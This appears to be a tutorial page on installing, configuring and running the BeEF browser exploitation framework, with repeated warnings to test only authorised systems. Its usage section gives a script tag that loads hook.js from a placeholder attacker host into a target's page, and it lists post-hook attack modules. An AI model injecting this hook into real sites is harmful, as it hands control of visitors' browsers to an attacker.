        <main class="main-content">
            <section id="overview" class="card">
                <h2>What is Beef-XSS?</h2>
                <p>The Browser Exploitation Framework (Beef) is a penetration testing tool that focuses on the web browser. It enables professional security analysts to assess the actual security posture of a target environment using client-side attack vectors.</p>
                
                <p>Beef-XSS hooks one or more web browsers and uses them as beachheads for launching directed command modules and further attacks against the system from within the browser context.</p>
            </section>
            
            <section id="prerequisites" class="card">
                <h2>Prerequisites</h2>
                <p>Before installing Beef-XSS, ensure your system meets the following requirements:</p>
                
                <ul>
                    <li>Linux-based operating system (Kali Linux recommended)</li>
                    <li>Ruby 2.7 or newer</li>
                    <li>Node.js and npm</li>
                    <li>Git</li>
                    <li>At least 2GB RAM (4GB recommended)</li>
                    <li>5GB of free disk space</li>
                    <li>Internet connection for downloading dependencies</li>
                </ul>
                
                <div class="warning">
                    <h3>Warning</h3>
                    <p>Beef-XSS should only be installed on systems you own or have explicit permission to test. Unauthorized use may violate laws and regulations.</p>
                </div>
            </section>
            
            <section id="installation" class="card">
                <h2>Installation Steps</h2>
                
                <div class="step">
                    <h3>Step 1: Update System Packages</h3>
                    <p>Start by updating your package repository and upgrading existing packages:</p>
                    <pre><code>sudo apt update && sudo apt upgrade -y</code></pre>
                </div>
                
                <div class="step">
                    <h3>Step 2: Install Dependencies</h3>
                    <p>Install the required dependencies for Beef-XSS:</p>
                    <pre><code>sudo apt install -y git ruby ruby-dev libsqlite3-dev \
libssl-dev python3-pip nodejs npm build-essential</code></pre>
                </div>
                
                <div class="step">
                    <h3>Step 3: Clone the Repository</h3>
                    <p>Clone the Beef-XSS repository from GitHub:</p>
                    <pre><code>git clone https://github.com/beefproject/beef.git</code></pre>
                    <p>Then navigate to the beef directory:</p>
                    <pre><code>cd beef</code></pre>
                </div>
                
                <div class="step">
                    <h3>Step 4: Install Ruby Gems</h3>
                    <p>Install the required Ruby gems using Bundler:</p>
                    <pre><code>gem install bundler
bundle install</code></pre>
                    <p>This may take several minutes to complete.</p>
                </div>
                
                <div class="note">
                    <h3>Note</h3>
                    <p>If you encounter permission errors during gem installation, you may need to use a Ruby version manager like RVM or rbenv, or install gems in a user directory.</p>
                </div>
            </section>
            
            <section id="configuration" class="card">
                <h2>Configuration</h2>
                
                <div class="step">
                    <h3>Step 5: Configure Beef-XSS</h3>
                    <p>Edit the main configuration file according to your needs:</p>
                    <pre><code>nano config.yaml</code></pre>
                    
                    <p>Key configuration options to consider:</p>
                    <ul>
                        <li><strong>host</strong>: IP address to bind to (0.0.0.0 for all interfaces)</li>
                        <li><strong>port</strong>: Web UI port (default: 3000)</li>
                        <li><strong>user</strong> and <strong>passwd</strong>: Change default credentials</li>
                        <li><strong>permitted_hooking_subnet</strong>: Restrict which IPs can be hooked</li>
                    </ul>
                    
                    <p>Example configuration snippet:</p>
                    <pre><code>beef:
    version: '0.5.0.0'
    credentials:
        user: "beef"
        passwd: "beef"
    restrictions:
        permitted_hooking_subnet: ["192.168.0.0/16"]
    http:
        host: "0.0.0.0"
        port: "3000"</code></pre>
                </div>
                
                <div class="warning">
                    <h3>Security Warning</h3>
                    <p>Always change the default credentials before using Beef-XSS in any environment. The default username and password are publicly known.</p>
                </div>
            </section>
            
            <section id="running" class="card">
                <h2>Running Beef-XSS</h2>
                
                <div class="step">
                    <h3>Step 6: Start Beef-XSS</h3>
                    <p>Launch Beef-XSS using the provided script:</p>
                    <pre><code>./beef</code></pre>
                    
                    <p>Alternatively, you can run it with custom configuration:</p>
                    <pre><code>./beef -c /path/to/your/config.yaml</code></pre>
                    
                    <p>You should see output similar to:</p>
                    <pre><code>[21:45:32]    |    Beef is loading. Wait a few seconds...
[21:45:32]    |    [*] Please wait for the BeEF service to start.
[21:45:33]    |    |    Hook URL: http://192.168.1.100:3000/hook.js
[21:45:33]    |    |    UI URL:   http://192.168.1.100:3000/ui/panel
[21:45:33]    |    [*] BeEF service started successfully!</code></pre>
                </div>
                
                <div class="step">
                    <h3>Step 7: Access the Web UI</h3>
                    <p>Open your web browser and navigate to the UI URL shown in the console (typically http://localhost:3000/ui/panel).</p>
                    
                    <p>Log in using the credentials you configured (default: beef/beef).</p>
                    
                    <div class="screenshot">
                        <div class="caption">Beef-XSS Login Interface</div>
                    </div>
                </div>
            </section>
            
            <section id="usage" class="card">
                <h2>Basic Usage</h2>
                
                <h3>Hooking a Browser</h3>
                <p>To hook a browser, inject the hook.js script into a webpage that your target will visit:</p>
                <pre><code>&lt;script src="http://your-beef-ip:3000/hook.js"&gt;&lt;/script&gt;</code></pre>
                
                <p>When a browser loads this script, it will appear in the "Hooked Browsers" panel of the Beef UI.</p>
                
                <h3>Executing Modules</h3>
                <p>Once a browser is hooked, you can execute various modules:</p>
                <ul>
                    <li>Browser reconnaissance</li>
                    <li>Social engineering attacks</li>
                    <li>Exploits against browser vulnerabilities</li>
                    <li>Network reconnaissance</li>
                </ul>
                
                <div class="note">
                    <h3>Note</h3>
                    <p>Be ethical and responsible. Only test systems you own or have explicit permission to test.</p>
                </div>
            </section>
            
            <section id="security" class="card">
                <h2>Security Considerations</h2>
                
                <ul>
                    <li>Never expose Beef-XSS to the public internet without proper security measures</li>
                    <li>Change default credentials immediately after installation</li>
                    <li>Use firewall rules to restrict access to the Beef web interface</li>
                    <li>Regularly update Beef-XSS to get security patches</li>
                    <li>Only use on isolated test networks when possible</li>
                </ul>
            </section>
            
            <section id="troubleshooting" class="card">
                <h2>Troubleshooting Common Issues</h2>
                
                <h3>Ruby Version Issues</h3>
                <p>If you encounter Ruby version conflicts, consider using a version manager:</p>
                <pre><code># Using RVM
curl -sSL https://get.rvm.io | bash -s stable
source ~/.rvm/scripts/rvm
rvm install ruby-2.7.0
rvm use ruby-2.7.0</code></pre>
                
                <h3>Port Already in Use</h3>
                <p>If port 3000 is already in use, either free the port or change Beef's configuration:</p>
                <pre><code># Find process using port 3000
lsof -i :3000

# Kill the process (if appropriate)
kill -9 [PID]

# Or change Beef's port in config.yaml
http:
    port: "3001"</code></pre>
                
                <h3>Bundle Install Errors</h3>
                <p>If bundle install fails, try:</p>
                <pre><code>bundle clean --force
bundle install</code></pre>
            </section>
            
